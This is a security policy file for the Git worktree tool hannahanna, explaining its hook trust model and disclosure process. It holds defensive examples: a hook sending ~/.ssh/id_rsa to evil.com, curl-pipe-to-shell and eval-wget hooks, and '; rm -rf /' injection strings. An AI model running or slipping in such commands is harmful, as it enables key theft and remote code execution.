# Security Policy

## Overview

hannahanna (`hn`) is a Git worktree manager that provides powerful automation features through lifecycle hooks and environment setup. While these features enable convenient workflows, they also require users to trust the repositories they work with.

**Key Security Principle:** Only use hannahanna in repositories you trust. Think of `.hannahanna.yml` as you would a `Makefile` or build script—it can execute arbitrary code.

## Security Considerations

### Hook Execution

**Risk Level: HIGH**

Hooks in `.hannahanna.yml` execute arbitrary shell commands with your user's permissions when you run `hn add` or `hn remove`.

**What This Means:**
- A malicious repository could run harmful commands
- Commands execute with full access to your files, network, and system
- Hook execution is by design—this is a feature, not a bug

**Example of Risk:**
```yaml
hooks:
  post_create: |
    # ⚠️ MALICIOUS EXAMPLE - DO NOT USE
    curl https://evil.com/steal?data=$(cat ~/.ssh/id_rsa)
```

**Protection Measures:**
1. **Always review** `.hannahanna.yml` before running `hn add`
2. **Treat untrusted repos carefully**—like downloading and running a script
3. **Use `--no-hooks` flag** when working with untrusted repositories: `hn add --no-hooks <name>`
4. **Inspect configuration:** `hn config show` or `cat .hannahanna.yml`

### Trust Model

hannahanna operates on a **trust-the-repository** model:

✅ **Safe:**
- Repositories you created
- Repositories from trusted teammates
- Open source projects you've reviewed
- Repositories from trusted organizations

⚠️ **Exercise Caution:**
- Newly cloned repositories before review
- Repositories with recent config changes
- Repositories from unknown sources
- Pull requests with config file changes

❌ **Do Not Use Without Review:**
- Repositories from untrusted sources
- Repositories you haven't inspected
- Any repo where you haven't read `.hannahanna.yml`

### Attack Vectors

#### 1. Social Engineering
**Scenario:** Attacker creates attractive-looking open source project with malicious hooks.

**Prevention:**
- Review `.hannahanna.yml` before first `hn add`
- Look for suspicious commands in hooks
- Check if hook behavior matches project description

#### 2. Supply Chain Attack
**Scenario:** Legitimate repository's `.hannahanna.yml` is modified with malicious hooks.

**Prevention:**
- Review changes to `.hannahanna.yml` in pull requests
- Use code review for config file modifications
- Monitor git history for unexpected config changes

#### 3. Dependency Confusion
**Scenario:** Hook downloads and executes scripts from external sources.

**Prevention:**
- Review hook scripts for `curl`, `wget`, or `download` commands
- Verify any external resources hooks depend on
- Use checksums or signatures for downloaded content

## Built-In Security Features

hannahanna includes several security measures:

### ✅ Path Traversal Protection
Symlinks and file operations are validated to prevent escaping the repository:
```rust
// Prevents: symlink source -> /etc/passwd
// Prevents: symlink target -> ../../../sensitive_file
```

### ✅ Input Validation
Worktree names, service names, and paths are validated:
- No path separators (`/`, `\`)
- No null bytes
- No leading dashes (prevents flag confusion)
- Length limits enforced
- Character restrictions applied

### ✅ Command Injection Prevention
User-supplied names and paths are validated before use in shell commands:
```rust
// Prevents: worktree name like "; rm -rf /"
// Prevents: service name like "$(malicious command)"
```

### ✅ File Locking
Concurrent operations use file locking to prevent corruption:
- Port registry uses exclusive locks for writes
- State directories protected from race conditions

### ✅ No Unsafe Code
The codebase contains no `unsafe` Rust code blocks.

## Security Roadmap

Future versions will include additional security features:

### Implemented in v0.1
- [x] `--no-hooks` flag to disable hook execution
- [x] Hook execution timeout (prevent infinite loops)

### Planned for v0.2
- [ ] Hook approval workflow for first-time repositories

### Planned for v0.3
- [ ] Hook sandboxing with resource limits
- [ ] Audit log for hook execution
- [ ] Config file signing/verification
- [ ] Allowlist/blocklist for external resources

## Responsible Disclosure

We take security seriously. If you discover a security vulnerability in hannahanna, please report it responsibly.

### Reporting a Vulnerability

**DO:**
1. Email security details to: [your-email@example.com] (replace with actual contact)
2. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)
3. Wait for acknowledgment before public disclosure

**DON'T:**
- Post vulnerabilities in public issues
- Exploit vulnerabilities maliciously
- Share details before coordinated disclosure

### Response Timeline

- **Initial Response:** Within 48 hours
- **Status Update:** Within 7 days
- **Fix Timeline:** Varies by severity
  - Critical: 7-14 days
  - High: 14-30 days
  - Medium: 30-60 days
  - Low: Best effort

### Disclosure Policy

We follow **coordinated disclosure**:
1. You report the issue privately
2. We acknowledge and investigate
3. We develop and test a fix
4. We release the fix
5. We publicly disclose (with credit to reporter)
6. You may disclose after public release

## Best Practices

### For Users

**Before Using hannahanna:**
1. Review `.hannahanna.yml` in repositories
2. Understand what hooks will execute
3. Verify external dependencies
4. Use `--no-hooks` for untrusted repos: `hn add --no-hooks <name>` or `hn remove --no-hooks <name>`

**When Contributing:**
1. Review `.hannahanna.yml` changes in PRs
2. Question suspicious hook commands
3. Validate external resources used in hooks
4. Document hook behavior clearly

**Regular Security Hygiene:**
1. Keep hannahanna updated
2. Review config files periodically
3. Monitor git history for config changes
4. Use separate accounts for untrusted work

### For Repository Maintainers

**When Adding `.hannahanna.yml`:**
1. Document what hooks do and why
2. Minimize hook complexity
3. Avoid downloading external scripts
4. Use pinned versions for dependencies
5. Add security comments for reviewers

**Example Safe Hook:**
```yaml
hooks:
  post_create: |
    # Install dependencies (reviewed in package.json)
    npm install

    # Run setup script (in this repository)
    npm run setup
```

**Example Unsafe Hook:**
```yaml
hooks:
  post_create: |
    # ⚠️ AVOID: Downloads and executes unknown script
    curl https://example.com/setup.sh | sh

    # ⚠️ AVOID: Unclear what this does
    eval "$(wget -qO- https://get.something.sh)"
```

### For Distributors

If you're packaging hannahanna for distribution:
1. Verify cryptographic signatures
2. Build from source when possible
3. Review dependencies for known vulnerabilities
4. Test in isolated environment first
5. Document security considerations for users

## Security Updates

Security updates will be:
- Released promptly for verified vulnerabilities
- Announced in release notes
- Tagged with `[SECURITY]` prefix
- Documented with CVE numbers (if applicable)

Subscribe to security announcements:
- GitHub Watch → Custom → Security alerts
- GitHub Releases RSS feed
- [Security mailing list] (if available)

## Additional Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Git Hooks Documentation](https://git-scm.com/docs/githooks)

## Questions?

For security questions that aren't vulnerabilities:
- Open a GitHub Discussion
- Ask in community forums
- Check documentation at [docs URL]

---

**Remember:** The most important security measure is reviewing `.hannahanna.yml` before using hannahanna in any repository. When in doubt, inspect the config file and use `--no-hooks` flag.
